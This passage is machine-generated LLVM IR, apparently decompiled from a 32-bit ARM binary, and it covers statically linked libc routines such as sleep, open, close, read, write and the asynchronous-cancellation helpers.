dec_label_pc_161cc:                               ; preds = %dec_label_pc_161b0
  %v0_161cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161cc, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_161cc, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_161cc
  %v5_161e4 = sub i32 0, %v0_161cc
  store i32 %v5_161e4, i32* %r2.global-to-local, align 4
  %v7_161e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_161f0.938 to i32), i32 58080) to i32*), align 4
  %v4_161ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_161ec, i32* %r0.global-to-local, align 4
  %v7_161f0 = add i32 %v7_161e8, %v0_161b4
  %v8_161f0 = inttoptr i32 %v7_161f0 to i32*
  store i32 %v5_161e4, i32* %v8_161f0, align 4
  %v0_161f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_161cc, %bb29
  %v0_161f4 = phi i32 [ %v0_161f4.pre, %bb29 ], [ %v0_161cc, %dec_label_pc_161cc ]
  store i32 %v0_161f4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161f8

dec_label_pc_161f8:                               ; preds = %dec_label_pc_161b0.dec_label_pc_161f8_crit_edge, %dec_label_pc_161a4, %.thread22
  %v0_161f8 = phi i32 [ %v0_161f8.pre, %dec_label_pc_161b0.dec_label_pc_161f8_crit_edge ], [ %v0_161a8, %dec_label_pc_161a4 ], [ %v0_161f4, %.thread22 ]
  store i32 %v0_161f8, i32* %r0.global-to-local, align 4
  %v2_161fc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_161fc, i32* @r4, align 4
  ret i32 %v0_161f8

; uselistorder directives
  uselistorder i32 %v0_161f8, { 1, 0 }
  uselistorder i32 %v0_161cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16180, { 2, 0, 1 }
  uselistorder i32 %v3_16138, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 11, 3, 0, 4, 1, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_161f8, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_161a4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16210 = load i32, i32* @r4, align 4
  %v6_16210 = load i32, i32* @r5, align 4
  %v9_16210 = load i32, i32* @r6, align 4
  %v12_16210 = load i32, i32* @r7, align 4
  %v15_16210 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16220 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_16220, label %dec_label_pc_16234, label %dec_label_pc_162a8

dec_label_pc_16234:                               ; preds = %entry
  %v0_16234 = call i32 @__aeabi_read_tp()
  %v1_16238 = add i32 %v0_16234, -1036
  %v2_16238 = inttoptr i32 %v1_16238 to i32*
  %v3_16238 = load i32, i32* %v2_16238, align 4
  %v1_1623c = and i32 %v3_16238, -71
  %v2_16240 = icmp ugt i32 %v1_1623c, 7
  store i1 %v2_16240, i1* %cpsr_c.global-to-local, align 1
  %v7_16240 = icmp eq i32 %v1_1623c, 8
  %v1_16244 = add i32 %v0_16234, -1168
  store i32 %v1_16244, i32* @r5, align 4
  br i1 %v7_16240, label %dec_label_pc_1624c, label %dec_label_pc_16320

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16234
  %v2_16250 = add i32 %v0_16234, -624
  %v3_16250 = inttoptr i32 %v2_16250 to i32*
  store i32 -1, i32* %v3_16250, align 4
  %v0_16254 = load i32, i32* @r5, align 4
  %v1_16254 = add i32 %v0_16254, 132
  store i32 %v1_16254, i32* @r6, align 4
  br label %dec_label_pc_16258

dec_label_pc_16258:                               ; preds = %dec_label_pc_1628c.dec_label_pc_16258_crit_edge, %dec_label_pc_1624c
  %v0_1625c = phi i32 [ %v0_1625c.pre, %dec_label_pc_1628c.dec_label_pc_16258_crit_edge ], [ %v1_16254, %dec_label_pc_1624c ]
  %v0_16258 = phi i32 [ %v0_16294, %dec_label_pc_1628c.dec_label_pc_16258_crit_edge ], [ %v0_16254, %dec_label_pc_1624c ]
  %v1_16258 = add i32 %v0_16258, 132
  %v2_16258 = inttoptr i32 %v1_16258 to i32*
  %v3_16258 = load i32, i32* %v2_16258, align 4
  store i32 %v0_1625c, i32* %r2.global-to-local, align 4
  store i32 %v3_16258, i32* @r4, align 4
  %v1_1626830 = inttoptr i32 %v0_1625c to i32*
  %v2_1626831 = load i32, i32* %v1_1626830, align 4
  %v3_1626c33 = icmp uge i32 %v2_1626831, %v3_16258
  store i1 %v3_1626c33, i1* %cpsr_c.global-to-local, align 1
  %v9_1626c39 = icmp eq i32 %v2_1626831, %v3_16258
  br i1 %v9_1626c39, label %dec_label_pc_16274, label %dec_label_pc_1628c

dec_label_pc_16274:                               ; preds = %dec_label_pc_16258, %dec_label_pc_16274.dec_label_pc_16268_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_16284 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16284, label %dec_label_pc_16288, label %dec_label_pc_16274.dec_label_pc_16268_crit_edge

dec_label_pc_16274.dec_label_pc_16268_crit_edge:  ; preds = %dec_label_pc_16274
  %v0_16268.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1626c.pre = load i32, i32* @r4, align 4
  %v1_16268 = inttoptr i32 %v0_16268.pre to i32*
  %v2_16268 = load i32, i32* %v1_16268, align 4
  %v3_1626c = icmp uge i32 %v2_16268, %v1_1626c.pre
  store i1 %v3_1626c, i1* %cpsr_c.global-to-local, align 1
  %v9_1626c = icmp eq i32 %v2_16268, %v1_1626c.pre
  br i1 %v9_1626c, label %dec_label_pc_16274, label %dec_label_pc_1628c

dec_label_pc_16288:                               ; preds = %dec_label_pc_16274
  %v0_16288 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1628c

dec_label_pc_1628c:                               ; preds = %dec_label_pc_16258, %dec_label_pc_16274.dec_label_pc_16268_crit_edge, %dec_label_pc_16288
  %v0_1628c = phi i32 [ %v0_16288, %dec_label_pc_16288 ], [ %v2_1626831, %dec_label_pc_16258 ], [ %v2_16268, %dec_label_pc_16274.dec_label_pc_16268_crit_edge ]
  %v1_1628c = phi i32 [ %v0_16288, %dec_label_pc_16288 ], [ %v3_16258, %dec_label_pc_16258 ], [ %v1_1626c.pre, %dec_label_pc_16274.dec_label_pc_16268_crit_edge ]
  %v3_1628c = icmp uge i32 %v0_1628c, %v1_1628c
  store i1 %v3_1628c, i1* %cpsr_c.global-to-local, align 1
  %v9_1628c = icmp eq i32 %v0_1628c, %v1_1628c
  br i1 %v9_1628c, label %dec_label_pc_16294, label %dec_label_pc_1628c.dec_label_pc_16258_crit_edge

dec_label_pc_1628c.dec_label_pc_16258_crit_edge:  ; preds = %dec_label_pc_1628c
  %v0_16294 = load i32, i32* @r5, align 4
  %v0_1625c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16258

dec_label_pc_16294:                               ; preds = %dec_label_pc_1628c
  %v0_1629c = load i32, i32* @r7, align 4
  %v2_1629c = add i32 %v0_1629c, 116
  %v3_1629c = inttoptr i32 %v2_1629c to i32*
  %v4_1629c = load i32, i32* %v3_1629c, align 4
  store i32 90792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1629c)
  %v0_162b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_162a8

dec_label_pc_162a8:                               ; preds = %entry, %dec_label_pc_16294
  %v0_162b0 = phi i32 [ 0, %entry ], [ %v0_162b0.pre, %dec_label_pc_16294 ]
  %v2_162b4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_162b4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_162c0 = call i32 @__libc_sigaction(i32 17, i32 %v0_162b0, i32 %v2_162b4)
  %v3_162c4 = load i32, i32* %stack_var_-60, align 4
  %v2_162c8 = icmp ne i32 %v3_162c4, 0
  store i1 %v2_162c8, i1* %cpsr_c.global-to-local, align 1
  %v7_162c8 = icmp eq i32 %v3_162c4, 1
  br i1 %v7_162c8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_162a8
  %v3_162cc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_162cc, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_162a8, %bb
  call void @__pseudo_cond_branch(i1 %v7_162c8, i32 ptrtoint (i32* @global_var_13180.943 to i32))
  %v2_162dc = ptrtoint i32* %stack_var_-32 to i32
  %v2_162e4 = call i32 @__libc_nanosleep(i32 %v2_162dc, i32 %v2_162dc)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162e8 = icmp eq i32 %v2_162e4, 0
  br i1 %v2_162e8, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_162fc = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_162fc, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_1630c = load i32, i32* %stack_var_-40, align 4
  %v1_16310 = and i32 %v3_1630c, 65536
  store i32 %v1_16310, i32* %r2.global-to-local, align 4
  %v2_16310 = icmp eq i32 %v1_16310, 0
  br i1 %v2_16310, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_16318 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_16318, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_16310, i32 ptrtoint (i32* @global_var_13180.943 to i32))
  br label %dec_label_pc_16320

dec_label_pc_16320:                               ; preds = %dec_label_pc_16234, %.thread5
  %v0_16320 = load i32, i32* @r4, align 4
  store i32 %v3_16210, i32* @r4, align 4
  store i32 %v6_16210, i32* @r5, align 4
  store i32 %v9_16210, i32* @r6, align 4
  store i32 %v12_16210, i32* @r7, align 4
  store i32 %v15_16210, i32* @lr, align 4
  ret i32 %v0_16320

; uselistorder directives
  uselistorder i32 %v0_16288, { 1, 0 }
  uselistorder i32 %v1_1626c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16320, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_162a8, { 1, 0 }
  uselistorder label %dec_label_pc_1628c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16274, { 1, 0 }
}

define i32 @function_16334(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16334:
  %v0_16334 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16334, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16334
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_16334 = load i32, i32* @r4, align 4
  %v4_16334 = lshr i32 %v2_16334, %arg1
  %v5_16334 = sub i32 32, %arg1
  %v6_16334 = shl i32 %v2_16334, %v5_16334
  %v7_16334 = or i32 %v6_16334, %v4_16334
  %v9_16334 = and i32 %v7_16334, %arg1
  store i32 %tmp, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16334, %bb
  %v8_16340 = phi i32 [ %arg1, %dec_label_pc_16334 ], [ %v9_16334, %bb ]
  ret i32 %v8_16340

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_16354 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16354, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16354 = load i32, i32* @r0, align 4
  ret i32 %v2_16354

bb1:                                              ; preds = %entry
  %v0_16358 = call i32 @__syscall_error()
  ret i32 %v0_16358
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16364 = load i32, i32* @global_var_27760.947, align 4
  %v2_16368 = icmp eq i32 %v3_16364, 0
  store i1 %v2_16368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16368, label %dec_label_pc_16370, label %entry.dec_label_pc_1638c_crit_edge

entry.dec_label_pc_1638c_crit_edge:               ; preds = %entry
  %v3_1638c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1638c

dec_label_pc_16370:                               ; preds = %entry
  %v0_16370 = load i32, i32* @r7, align 4
  store i32 %v0_16370, i32* @ip, align 4
  %v0_16380 = load i32, i32* @r0, align 4
  %v2_16380 = icmp ugt i32 %v0_16380, -4097
  %v7_16380 = icmp eq i32 %v0_16380, -4096
  store i1 %v7_16380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16380, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1638c, %bb8, %bb9, %dec_label_pc_16370
  %merge2 = phi i32 [ %v0_16380, %dec_label_pc_16370 ], [ %v0_163b0, %dec_label_pc_1638c ], [ %v0_163c0, %bb8 ], [ %v0_163c0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_16370
  %v0_16388 = call i32 @__syscall_error()
  br label %dec_label_pc_1638c

dec_label_pc_1638c:                               ; preds = %entry.dec_label_pc_1638c_crit_edge, %bb7
  %v3_1638c = phi i32 [ %v3_1638c.pre, %entry.dec_label_pc_1638c_crit_edge ], [ %v0_16388, %bb7 ]
  %v9_1638c = load i32, i32* @r7, align 4
  store i32 %v9_1638c, i32* %stack_var_-8, align 4
  %v12_1638c = load i32, i32* @lr, align 4
  %v0_16390 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16390, i32* @ip, align 4
  store i32 %v3_1638c, i32* @r7, align 4
  %v1_163ac = call i32 @__libc_disable_asynccancel(i32 %v0_16390)
  %v0_163b0 = load i32, i32* @r7, align 4
  store i32 %v0_163b0, i32* @r0, align 4
  %v2_163b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163b4, i32* @r7, align 4
  store i32 %v12_1638c, i32* @lr, align 4
  %v2_163b8 = icmp ugt i32 %v0_163b0, -4097
  %v7_163b8 = icmp eq i32 %v0_163b0, -4096
  store i1 %v7_163b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163b8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1638c
  %v0_163c0 = call i32 @__syscall_error()
  %v0_163d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163d0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_163d0 = load i32, i32* @r1, align 4
  %v2_163d0 = load i32, i32* @r4, align 4
  %v3_163d0 = udiv i32 %v2_163d0, 64
  %v4_163d0 = mul i32 %v2_163d0, 67108864
  %v5_163d0 = or i32 %v3_163d0, %v4_163d0
  %v8_163d0 = and i32 %v5_163d0, %v1_163d0
  store i32 %v8_163d0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_163c0, { 1, 0 }
  uselistorder i32 %v0_163b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_16380, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1638c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_163e4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_163e4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_163e4 = load i32, i32* @r0, align 4
  ret i32 %v2_163e4

bb1:                                              ; preds = %entry
  %v0_163e8 = call i32 @__syscall_error()
  ret i32 %v0_163e8
}

define i32 @__libc_open(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_163f4 = load i32, i32* @global_var_27760.947, align 4
  %v2_163f8 = icmp eq i32 %v3_163f4, 0
  store i1 %v2_163f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163f8, label %dec_label_pc_16400, label %entry.dec_label_pc_1641c_crit_edge

entry.dec_label_pc_1641c_crit_edge:               ; preds = %entry
  %v3_1641c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1641c

dec_label_pc_16400:                               ; preds = %entry
  %v0_16410 = load i32, i32* @r0, align 4
  %v2_16410 = icmp ugt i32 %v0_16410, -4097
  %v7_16410 = icmp eq i32 %v0_16410, -4096
  store i1 %v7_16410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16410, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_1641c, %bb11, %bb12, %dec_label_pc_16400
  %merge2 = phi i32 [ %v0_16410, %dec_label_pc_16400 ], [ %v0_16440, %dec_label_pc_1641c ], [ %v0_16450, %bb11 ], [ %v0_16450, %bb12 ]
  ret i32 %merge2

bb10:                                             ; preds = %dec_label_pc_16400
  %v0_16418 = call i32 @__syscall_error()
  br label %dec_label_pc_1641c

dec_label_pc_1641c:                               ; preds = %entry.dec_label_pc_1641c_crit_edge, %bb10
  %v3_1641c = phi i32 [ %v3_1641c.pre, %entry.dec_label_pc_1641c_crit_edge ], [ %v0_16418, %bb10 ]
  store i32 %v3_1641c, i32* %stack_var_-24, align 4
  %v12_1641c = load i32, i32* @r2, align 4
  %v15_1641c = load i32, i32* @r3, align 4
  %v18_1641c = load i32, i32* @r7, align 4
  store i32 %v18_1641c, i32* %stack_var_-8, align 4
  %v21_1641c = load i32, i32* @lr, align 4
  %v0_16420 = call i32 @__libc_enable_asynccancel()
  %v2_16428 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v12_1641c, i32* @r2, align 4
  store i32 %v15_1641c, i32* @r3, align 4
  store i32 %v2_16428, i32* @r7, align 4
  %v1_1643c = call i32 @__libc_disable_asynccancel(i32 %v0_16420)
  %v0_16440 = load i32, i32* @r7, align 4
  store i32 %v0_16440, i32* @r0, align 4
  %v2_16444 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16444, i32* @r7, align 4
  store i32 %v21_1641c, i32* @lr, align 4
  %v2_16448 = icmp ugt i32 %v0_16440, -4097
  %v7_16448 = icmp eq i32 %v0_16440, -4096
  store i1 %v7_16448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16448, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_1641c
  %v0_16450 = call i32 @__syscall_error()
  %v0_16460 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16460, label %bb12, label %bb

bb12:                                             ; preds = %bb11
  %v1_16460 = load i32, i32* @r1, align 4
  %v2_16460 = inttoptr i32 %v1_16460 to i64*
  %v3_16460 = load i64, i64* %v2_16460, align 4
  %v4_16460 = load i32, i32* @r4, align 4
  %v5_16460 = trunc i64 %v3_16460 to i32
  %v6_16460 = udiv i64 %v3_16460, 4294967296
  %v7_16460 = trunc i64 %v6_16460 to i32
  store i32 %v5_16460, i32* @r2, align 4
  %v9_16460 = sub i32 %v7_16460, %v4_16460
  store i32 %v9_16460, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16450, { 1, 0 }
  uselistorder i32 %v0_16440, { 0, 2, 3, 1 }
  uselistorder i32 %v0_16410, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1641c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_16474 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16474, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16474 = load i32, i32* @r0, align 4
  ret i32 %v2_16474

bb1:                                              ; preds = %entry
  %v0_16478 = call i32 @__syscall_error()
  ret i32 %v0_16478
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16484 = load i32, i32* @global_var_27760.947, align 4
  %v2_16488 = icmp eq i32 %v3_16484, 0
  store i1 %v2_16488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16488, label %dec_label_pc_16490, label %entry.dec_label_pc_164ac_crit_edge

entry.dec_label_pc_164ac_crit_edge:               ; preds = %entry
  %v3_164ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_164ac

dec_label_pc_16490:                               ; preds = %entry
  %v0_164a0 = load i32, i32* @r0, align 4
  %v2_164a0 = icmp ugt i32 %v0_164a0, -4097
  %v7_164a0 = icmp eq i32 %v0_164a0, -4096
  store i1 %v7_164a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164a0, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_164ac, %bb10, %bb11, %dec_label_pc_16490
  %merge2 = phi i32 [ %v0_164a0, %dec_label_pc_16490 ], [ %v0_164d0, %dec_label_pc_164ac ], [ %v0_164e0, %bb10 ], [ %v0_164e0, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_16490
  %v0_164a8 = call i32 @__syscall_error()
  br label %dec_label_pc_164ac

dec_label_pc_164ac:                               ; preds = %entry.dec_label_pc_164ac_crit_edge, %bb9
  %v3_164ac = phi i32 [ %v3_164ac.pre, %entry.dec_label_pc_164ac_crit_edge ], [ %v0_164a8, %bb9 ]
  %v12_164ac = load i32, i32* @r3, align 4
  %v15_164ac = load i32, i32* @r7, align 4
  store i32 %v15_164ac, i32* %stack_var_-8, align 4
  %v18_164ac = load i32, i32* @lr, align 4
  %v0_164b0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_164ac, i32* @r3, align 4
  store i32 %v3_164ac, i32* @r7, align 4
  %v1_164cc = call i32 @__libc_disable_asynccancel(i32 %v0_164b0)
  %v0_164d0 = load i32, i32* @r7, align 4
  store i32 %v0_164d0, i32* @r0, align 4
  %v2_164d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164d4, i32* @r7, align 4
  store i32 %v18_164ac, i32* @lr, align 4
  %v2_164d8 = icmp ugt i32 %v0_164d0, -4097
  %v7_164d8 = icmp eq i32 %v0_164d0, -4096
  store i1 %v7_164d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164d8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_164ac
  %v0_164e0 = call i32 @__syscall_error()
  %v0_164f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_164f0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_164e0, { 1, 0 }
  uselistorder i32 %v0_164d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_164a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164ac, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_16504 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16504, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16504 = load i32, i32* @r0, align 4
  ret i32 %v2_16504

bb1:                                              ; preds = %entry
  %v0_16508 = call i32 @__syscall_error()
  ret i32 %v0_16508

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16514 = load i32, i32* @global_var_27760.947, align 4
  %v2_16518 = icmp eq i32 %v3_16514, 0
  br i1 %v2_16518, label %dec_label_pc_16520, label %entry.dec_label_pc_1653c_crit_edge

entry.dec_label_pc_1653c_crit_edge:               ; preds = %entry
  %v3_1653c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1653c

dec_label_pc_16520:                               ; preds = %entry
  %v0_16530 = load i32, i32* @r0, align 4
  %v2_16530 = icmp ugt i32 %v0_16530, -4097
  br i1 %v2_16530, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1653c, %dec_label_pc_16520
  %merge = phi i32 [ %v0_16530, %dec_label_pc_16520 ], [ %v0_16560, %dec_label_pc_1653c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_16520
  %v0_16538 = call i32 @__syscall_error()
  br label %dec_label_pc_1653c

dec_label_pc_1653c:                               ; preds = %entry.dec_label_pc_1653c_crit_edge, %bb8
  %v3_1653c = phi i32 [ %v3_1653c.pre, %entry.dec_label_pc_1653c_crit_edge ], [ %v0_16538, %bb8 ]
  %v6_1653c = load i32, i32* @r1, align 4
  %v15_1653c = load i32, i32* @r7, align 4
  store i32 %v15_1653c, i32* %stack_var_-8, align 4
  %v18_1653c = load i32, i32* @lr, align 4
  %v0_16540 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1653c, i32* @r1, align 4
  store i32 %v3_1653c, i32* @r7, align 4
  %v1_1655c = call i32 @__libc_disable_asynccancel(i32 %v0_16540)
  %v0_16560 = load i32, i32* @r7, align 4
  store i32 %v0_16560, i32* @r0, align 4
  %v2_16564 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16564, i32* @r7, align 4
  store i32 %v18_1653c, i32* @lr, align 4
  %v2_16568 = icmp ugt i32 %v0_16560, -4097
  br i1 %v2_16568, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1653c
  %v0_16570 = call i32 @__syscall_error()
  ret i32 %v0_16570

; uselistorder directives
  uselistorder i32 %v0_16560, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1653c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_16580 = load i32, i32* %r0.global-to-local, align 4
  %v1_16580 = and i32 %v0_16580, 2
  %v2_16580 = icmp eq i32 %v1_16580, 0
  %v3_16584 = load i32, i32* @r4, align 4
  store i32 %v3_16584, i32* %stack_var_-16, align 4
  br i1 %v2_16580, label %dec_label_pc_1658c, label %dec_label_pc_16600

dec_label_pc_1658c:                               ; preds = %entry
  %v0_1658c = call i32 @__aeabi_read_tp()
  store i32 %v0_1658c, i32* %r0.global-to-local, align 4
  %v1_16590 = add i32 %v0_1658c, -1036
  %v2_16590 = inttoptr i32 %v1_16590 to i32*
  %v3_16590 = load i32, i32* %v2_16590, align 4
  %v1_16594 = add i32 %v0_1658c, -1168
  store i32 %v1_16594, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_165cc.dec_label_pc_16598_crit_edge, %dec_label_pc_1658c
  %v0_165a4 = phi i32 [ %v0_165a4.pre, %dec_label_pc_165cc.dec_label_pc_16598_crit_edge ], [ %v1_16594, %dec_label_pc_1658c ]
  %v0_16598 = phi i32 [ %v0_165cc, %dec_label_pc_165cc.dec_label_pc_16598_crit_edge ], [ %v3_16590, %dec_label_pc_1658c ]
  %v1_16598 = and i32 %v0_16598, -3
  store i32 %v1_16598, i32* %r7.global-to-local, align 4
  store i32 %v0_16598, i32* %r4.global-to-local, align 4
  store i32 %v1_16598, i32* @r1, align 4
  %v1_165a4 = add i32 %v0_165a4, 132
  store i32 %v1_165a4, i32* @r2, align 4
  %v1_165a823 = inttoptr i32 %v1_165a4 to i32*
  %v2_165a824 = load i32, i32* %v1_165a823, align 4
  %v3_165ac26 = icmp uge i32 %v2_165a824, %v0_16598
  store i1 %v3_165ac26, i1* %cpsr_c.global-to-local, align 1
  %v9_165ac32 = icmp eq i32 %v2_165a824, %v0_16598
